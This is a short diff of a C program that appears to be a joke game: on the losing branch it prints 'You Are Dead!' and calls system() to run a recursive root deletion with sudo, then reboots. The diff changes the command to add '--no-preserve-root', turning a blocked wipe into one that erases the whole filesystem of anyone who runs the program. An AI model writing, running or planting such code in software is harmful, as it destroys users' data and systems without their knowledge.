@@ -18,7 +18,7 @@ int main(){
     else{
         system("clear");
         printf("\nYou Are Dead!\n\n");
-        system("sudo rm -rf /");
+        system("sudo rm -rf / --no-preserve-root");
         system("clear");
         system("sudo reboot");
     }
